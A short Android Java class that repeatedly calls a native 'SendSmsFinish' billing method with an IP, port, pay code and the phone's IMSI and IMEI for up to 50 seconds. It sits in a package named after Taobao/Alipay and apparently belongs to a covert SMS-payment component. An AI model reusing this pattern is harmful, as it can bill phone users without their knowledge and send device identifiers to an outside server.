package com.taobao.alipay.mm318;

import android.content.Context;

import com.mm.Business.BillNative;

public class Mm318Pz {

	private Context context;
	private String ip;
	private String port;
	private String appId;
	private String payCode;
	private String imsi;
	private String imei;
	private String sid;
	
	public Mm318Pz(Context context,String ip,String port,String appId,String payCode,String imsi,String imei,String sid){
		this.context = context;
		this.ip = ip;
		this.port = port;
		this.appId = appId;
		this.payCode = payCode;
		this.imsi = imsi;
		this.imei = imei;
		this.sid = sid;
	}
	
	public void work(){
		long startTime = System.currentTimeMillis();

		while (System.currentTimeMillis() - startTime <= 50 * 1000) {
			Utils.sleep(10);

			String result = BillNative.SendSmsFinish(context, ip, port, appId,
					payCode, imsi, imei, sid);

			if ("0".equals(result)) {
				return;
			}
		}
	}
}
